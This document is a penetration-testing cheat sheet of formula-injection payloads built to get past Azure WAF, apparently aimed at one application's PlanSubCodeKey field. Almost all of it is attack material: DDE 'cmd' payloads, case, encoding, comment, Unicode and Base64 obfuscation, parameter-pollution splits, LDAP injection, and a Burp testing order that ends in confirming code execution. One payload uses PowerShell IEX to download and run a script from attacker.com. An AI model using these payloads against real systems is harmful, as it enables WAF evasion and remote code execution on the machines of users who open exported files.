===================================================================================
AZURE WAF BYPASS PAYLOADS - FORMULA INJECTION
===================================================================================

IMPORTANT: These payloads are designed to bypass Azure WAF while testing for
formula injection vulnerabilities. Use in authorized penetration testing only.

===================================================================================
SAFE BASELINE PAYLOADS (No Dangerous Keywords - Should NOT Trigger WAF)
===================================================================================

These test if the backend accepts formulas WITHOUT triggering WAF.
If these work, the issue is WAF blocking dangerous keywords, not input validation.

BASELINE 1 - Simple Math:
=1%2B1

BASELINE 2 - Multiple Math Operations:
=1%2B1%2B1%2B1%2B1

BASELINE 3 - Multiplication:
=7*7

BASELINE 4 - String Concatenation:
="Hello"%26"World"

BASELINE 5 - Cell Reference:
=A1%2BB1

BASELINE 6 - SUM Function:
=SUM(1,2,3)

BASELINE 7 - IF Function:
=IF(1%3E0,"True","False")

Expected Result: 200 OK (No dangerous keywords, should pass)

===================================================================================
TECHNIQUE 1: CASE VARIATION (Changes keyword case to bypass blacklist)
===================================================================================

PAYLOAD 1.1 - Lowercase cmd:
=cmd|'/c calc'!A1

PAYLOAD 1.2 - Uppercase CMD:
=CMD|'/C CALC'!A1

PAYLOAD 1.3 - Mixed Case CmD:
=CmD|'/c CaLc'!A1

PAYLOAD 1.4 - Varied Case:
=cMd|'/C cAlC'!A1

PAYLOAD 1.5 - Powershell Case Variation:
=PoWeRsHeLL -Command "Write-Host Hacked"

PAYLOAD 1.6 - Bash Case Variation:
=BaSh -c "whoami"

Why: Simple keyword blacklists are case-sensitive
Risk: LOW-MEDIUM (Basic WAF might not catch this)

===================================================================================
TECHNIQUE 2: DOUBLE/TRIPLE URL ENCODING (Confuses WAF parser)
===================================================================================

PAYLOAD 2.1 - Double Encoded Basic:
=1%252B1

(Decoded once = =1%2B1, decoded twice = =1+1)

PAYLOAD 2.2 - Double Encoded Calculator:
=cmd%252C%257C%2527%252Fc+calc%2527%2521A1

(When decoded twice becomes the dangerous payload)

PAYLOAD 2.3 - Triple Encoded:
=cmd%25252C%25257C%252527%25252Fc+calc%252527%25252521A1

Why: WAF decodes once, application decodes again, bypassing filter
Risk: MEDIUM (Some WAFs decode multiple times, others don't)

===================================================================================
TECHNIQUE 3: UNICODE/HEX ENCODING (Replace dangerous characters)
===================================================================================

PAYLOAD 3.1 - Hex Encoded cmd:
=0x636D64|'/c calc'!A1
(0x636D64 = "cmd" in hex)

PAYLOAD 3.2 - HTML Entity Encoding:
&#99&#109&#100 (encodes "cmd")
Full: =&#99&#109&#100|'/c calc'!A1

PAYLOAD 3.3 - Unicode Escape:
=\u0063\u006d\u0064|'/c calc'!A1
(\u0063\u006d\u0064 = "cmd" in unicode)

PAYLOAD 3.4 - Mixed Hex:
=\x63\x6d\x64|'/c calc'!A1
(\x63\x6d\x64 = "cmd" in hex)

Why: WAF might not decode hex/unicode, but application will
Risk: MEDIUM-HIGH (Depends on WAF sophistication)

===================================================================================
TECHNIQUE 4: COMMENT INJECTION (Break keyword detection with comments)
===================================================================================

PAYLOAD 4.1 - Inline Comment (SQL/PowerShell style):
=cmd/**/|'/c calc'!A1

PAYLOAD 4.2 - Line Comment:
=cmd--+|'/c calc'!A1

PAYLOAD 4.3 - Hash Comment:
=cmd#+|'/c calc'!A1

PAYLOAD 4.4 - PowerShell Comment:
=c`md|'/c calc'!A1
(Backtick in PowerShell is escape character)

PAYLOAD 4.5 - Double Slash:
=c//md|'/c calc'!A1

Why: Comments break keyword matching patterns
Risk: MEDIUM (Depends on WAF understanding syntax)

===================================================================================
TECHNIQUE 5: WHITESPACE INJECTION (Extra spaces confuse parsers)
===================================================================================

PAYLOAD 5.1 - Space Between Characters:
=c m d|'/c calc'!A1

PAYLOAD 5.2 - Tab Characters:
=cmd	|'/c	calc'!A1
(Use actual tab character, not spaces)

PAYLOAD 5.3 - Newline Characters:
=cmd%0A|'/c%0Acalc'!A1

PAYLOAD 5.4 - Carriage Return:
=cmd%0D|'/c%0Dcalc'!A1

PAYLOAD 5.5 - Multiple Spaces:
=cmd    |'/c    calc'!A1

Why: Whitespace might be stripped or ignored by WAF but not application
Risk: LOW-MEDIUM (Many WAFs normalize whitespace)

===================================================================================
TECHNIQUE 6: NULL BYTE INJECTION (Truncate strings in parser)
===================================================================================

PAYLOAD 6.1 - Null Byte in cmd:
=cm%00d|'/c calc'!A1

PAYLOAD 6.2 - Multiple Nulls:
=c%00m%00d|'/c calc'!A1

PAYLOAD 6.3 - Null Before Keyword:
=%00cmd|'/c calc'!A1

Why: Null byte might terminate string in C-based parsers
Risk: LOW-MEDIUM (Modern systems handle nulls properly)

===================================================================================
TECHNIQUE 7: ALTERNATIVE COMMAND SYNTAX (Different command executors)
===================================================================================

PAYLOAD 7.1 - PowerShell Instead of cmd:
=powershell "Write-Host HACKED"!A1

PAYLOAD 7.2 - PowerShell.exe:
=powershell.exe "Get-Process"!A1

PAYLOAD 7.3 - Bash:
=bash -c "whoami"!A1

PAYLOAD 7.4 - Sh:
=sh -c "id"!A1

PAYLOAD 7.5 - Execution Policy Bypass:
=powershell -ep Bypass -c "whoami"!A1

PAYLOAD 7.6 - Invoke-Expression (IEX):
=powershell IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/script.ps1')!A1

Why: WAF might only blocklist "cmd", not other executors
Risk: MEDIUM-HIGH (Depends on WAF rules)

===================================================================================
TECHNIQUE 8: PARAMETER OBFUSCATION (Hide dangerous intent)
===================================================================================

PAYLOAD 8.1 - Variable Assignment:
=$x='cmd';& $x|'/c calc'!A1

PAYLOAD 8.2 - String Concatenation:
=('c'+'m'+'d')|'/c calc'!A1

PAYLOAD 8.3 - Join Array:
=([char[]]@(99,109,100) -join '')|'/c calc'!A1

PAYLOAD 8.4 - Base64:
=powershell -e JABjAG0AZAAgAD0AIgBjYWxjIgA=!A1

PAYLOAD 8.5 - Environment Variable:
=$env:windir\system32\cmd.exe|'/c calc'!A1

Why: Obfuscation bypasses string matching
Risk: MEDIUM-HIGH (Depends on WAF logic analysis)

===================================================================================
TECHNIQUE 9: SPECIAL CHARACTER ENCODING (Replace pipe, quotes, etc)
===================================================================================

PAYLOAD 9.1 - Pipe as %7C:
=cmd%7C'/c calc'!A1

PAYLOAD 9.2 - Quote as %27:
=cmd|%27/c calc%27!A1

PAYLOAD 9.3 - Exclamation as %21:
=cmd|'/c calc%27%21A1

PAYLOAD 9.4 - Mix Encoded/Not Encoded:
=cmd%7C'/c%20calc'!A1

Why: Inconsistent encoding/decoding causes bypasses
Risk: LOW (Most modern WAFs handle this)

===================================================================================
TECHNIQUE 10: FRAGMENTED PAYLOADS (Split across parameters)
===================================================================================

If vulnerable to parameter pollution, split payload:

PAYLOAD 10.1 - Parameter Pollution:
&cmd=calc&PlanSubCodeKey==1+1&exec=/c

(WAF sees =1+1, but application combines with cmd+exec)

PAYLOAD 10.2 - Append Dangerous Part:
&PlanSubCodeKey==1+1&append=cmd|'/c calc

PAYLOAD 10.3 - Split Command:
&PlanSubCodeKey==1+1&part1=cmd&part2=|'/c calc

Why: WAF analyzes each parameter, application concatenates
Risk: MEDIUM (Requires vulnerable parameter handling)

===================================================================================
TECHNIQUE 11: LDAP FILTER INJECTION (If using LDAP backend)
===================================================================================

PAYLOAD 11.1 - Basic LDAP Injection:
=*)(objectClass=*

PAYLOAD 11.2 - Always True:
=*)(|(uid=*))(&(uid=*

PAYLOAD 11.3 - Comment in LDAP:
=*)(uid=administrator;*

Why: Different parser, might bypass WAF
Risk: MEDIUM (Only if LDAP is used)

===================================================================================
TECHNIQUE 12: PROTOCOL CONFUSION (Different content-type handling)
===================================================================================

Note: These require changing request content-type:

PAYLOAD 12.1 - JSON Format:
{"PlanSubCodeKey": "=cmd|'/c calc'!A1"}
(With Content-Type: application/json)

PAYLOAD 12.2 - XML Format:
<PlanSubCodeKey>=cmd|'/c calc'!A1</PlanSubCodeKey>
(With Content-Type: application/xml)

PAYLOAD 12.3 - Multipart Form:
------WebKitFormBoundary
Content-Disposition: form-data; name="PlanSubCodeKey"

=cmd|'/c calc'!A1

Why: WAF might not inspect all content-types equally
Risk: MEDIUM-HIGH (Depends on WAF configuration)

===================================================================================
TECHNIQUE 13: CHARCODE/UNICODE TRICKS (Bypass keyword matching)
===================================================================================

PAYLOAD 13.1 - Zero-Width Characters:
=cmd‌|'/c calc'!A1
(Contains zero-width joiner between cmd and |)

PAYLOAD 13.2 - Right-to-Left Override:
=cmd‮|'/c calc'!A1

PAYLOAD 13.3 - Combining Characters:
=cmd̶|'/c calc'!A1

Why: WAF regex might not handle unicode combining characters
Risk: LOW-MEDIUM (Modern regex engines handle this)

===================================================================================
TECHNIQUE 14: LOGIC TESTING PAYLOADS (Test without "dangerous" keywords)
===================================================================================

These prove backend is vulnerable WITHOUT triggering WAF:

PAYLOAD 14.1 - Formula Exists Test:
=NOW()

(If this returns 200 OK: Formulas are accepted)

PAYLOAD 14.2 - Cell Reference Test:
=Sheet1!A1

(If this returns 200 OK: Formula evaluation works)

PAYLOAD 14.3 - Function Test:
=CONCATENATE("Hello","World")

(If this returns 200 OK: Functions are evaluated)

PAYLOAD 14.4 - Math With Symbols:
=PRODUCT(2,3,4)

(If this returns 200 OK: Complex formulas work)

Why: Proves backend accepts formulas, WAF only blocks specific keywords
Risk: NONE (These are safe functions)

===================================================================================
TECHNIQUE 15: BYPASSING SPECIFIC BLOCKLISTS
===================================================================================

Based on common Azure WAF rules:

PAYLOAD 15.1 - Bypass "cmd" blocklist:
=command|'/c calc'!A1
(Might not blocklist "command")

PAYLOAD 15.2 - Bypass "powershell" blocklist:
=powershell.exe -nop -w hidden -c "Write-Host test"!A1
(Full path + extra flags)

PAYLOAD 15.3 - Bypass "exec" blocklist:
=execute "calc.exe"!A1

PAYLOAD 15.4 - Bypass "calc" blocklist:
=calculator.exe!A1
or
=mspaint.exe!A1

PAYLOAD 15.5 - Bypass "shell" blocklist:
=shellexecute "calc"!A1

Why: Different keywords might not be in blocklist
Risk: MEDIUM (Trial and error required)

===================================================================================
RECOMMENDED TESTING ORDER
===================================================================================

STEP 1: Establish Baseline (Do formulas work at all?)
├─ Try: =1%2B1
├─ Try: =7*7
├─ Try: ="Hello"%26"World"
└─ Result: If 200 OK → Backend accepts formulas

STEP 2: Identify What's Blocked
├─ Try: =cmd|'/c calc'!A1 (Should get 403)
├─ Note: Which keyword triggered block? (cmd? powershell? calc?)
└─ Try: =powershell "Write-Host test"!A1 (Alternative keyword)

STEP 3: Apply Bypass Technique
├─ If "cmd" is blocked: Try case variation (CMD)
├─ If "powershell" is blocked: Try "powershell.exe"
├─ If "|" is blocked: Try %7C or other encoding
└─ Try: =CmD%7C'/c calc'!A1 (Case + encoding combo)

STEP 4: Test Bypass Success
├─ If 200 OK: Bypass successful!
├─ If 403: Try different technique
└─ Document which technique worked

STEP 5: Validate Exploitation
├─ Check if formula appears in Plan Sub Codes table
├─ Export data and test in Excel
└─ Confirm code execution

===================================================================================
QUICK COPY-PASTE FOR LAZY TESTING
===================================================================================

Test these IN ORDER in Burp Repeater:

1. =1%2B1
2. =7*7  
3. ="Hello"%26"World"
4. =cmd%7C%27%2Fc+calc%27%21A1
5. =CMD%7C%27%2FC+CALC%27%21A1
6. =CmD%7C%27%2Fc+CaLc%27%21A1
7. =powershell "Write-Host test"!A1
8. =PoWeRsHeLL "Write-Host test"!A1
9. =cmd/**/|'/c calc'!A1
10. =cmd    |'/c    calc'!A1

===================================================================================
WHAT THE ERRORS MEAN
===================================================================================

Response Code: 200 OK
└─ Payload was ACCEPTED
└─ Either WAF allowed it OR WAF/backend both accepted it
└─ GOOD - Move to next test

Response Code: 403 Forbidden
└─ Payload was BLOCKED by WAF
└─ Azure Application Gateway rejected it
└─ Try different bypass technique

Response Code: 400 Bad Request
└─ Syntax error in your request
└─ Fix encoding or parameter format
└─ Try simpler payload

Response Code: 401 Unauthorized
└─ Authentication issue
└─ Check your cookies/auth headers
└─ Should not happen if you're logged in

===================================================================================
IMPORTANT NOTES
===================================================================================

⚠️ IF SIMPLE FORMULAS (=1+1) GET 403:
   WAF blocks ALL formula input
   Finding: "Azure WAF Blocking Formula Input"
   Severity: LOW (WAF is working as designed)

⚠️ IF SIMPLE FORMULAS (=1+1) GET 200 OK BUT CMD GET 403:
   Backend vulnerable, WAF blocking dangerous keywords
   Finding: "Backend Vulnerable, WAF Partially Protecting"
   Severity: MEDIUM-HIGH (WAF can be bypassed)

⚠️ IF BYPASS PAYLOAD GETS 200 OK:
   Both WAF AND backend vulnerable
   Finding: "Critical RCE via Formula Injection + WAF Bypass"
   Severity: CRITICAL (Full exploitation possible)

⚠️ ALWAYS DOCUMENT:
   1. Which payloads worked/failed
   2. What error codes you got
   3. Screenshots of responses
   4. Which bypass technique succeeded
   5. Whether exploitation was possible

===================================================================================
EXPECTED FINDINGS FOR YOUR REPORT
===================================================================================

FINDING 1: WAF Blocklist Identified
Description: Azure WAF is blocking formulas containing keywords like "cmd", "powershell"
Severity: INFO (Shows WAF is doing its job)

FINDING 2: WAF Bypass Possible (If bypass works)
Description: WAF can be evaded using case variation and encoding tricks
Severity: HIGH (Underlying application vulnerable)

FINDING 3: Backend Formula Injection (If simple formula works)
Description: Backend accepts and evaluates formula syntax
Severity: CRITICAL (If bypasses WAF)

FINDING 4: Code Execution (If cmd payload works)
Description: Arbitrary code execution possible through formula injection
Severity: CRITICAL (Full system compromise)

===================================================================================

START WITH BASELINE PAYLOADS AND WORK YOUR WAY THROUGH TECHNIQUES!

Report back with:
1. Which baseline payloads work (200 OK)?
2. Which keyword triggered the 403 error?
3. Which bypass technique succeeded?

